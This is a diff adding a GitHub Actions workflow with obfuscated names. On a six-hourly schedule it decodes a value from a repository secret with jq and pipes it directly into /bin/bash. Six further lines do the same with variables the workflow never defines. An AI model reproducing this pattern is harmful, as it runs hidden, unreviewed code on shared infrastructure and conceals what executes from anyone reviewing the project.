@@ -1,0 +1,24 @@
+name: naipingsixidawanzi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '19 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: naipingsixidawanzi
+        env:
+          yjjjy8701: ${{ secrets.yjjjy8701 }}
+        run: |
+          echo $yjjjy8701 | jq -r .vjac6 | /bin/bash
+          echo $td9850 | jq -r .r060 | /bin/bash
+          echo $j9 | jq -r .fre6 | /bin/bash
+          echo $fcys231 | jq -r .y96666 | /bin/bash
+          echo $dvfx06820 | jq -r .tu700 | /bin/bash
+          echo $cznrd0 | jq -r .vriqp4 | /bin/bash
+          echo $sfeq145 | jq -r .jmdix61 | /bin/bash
+
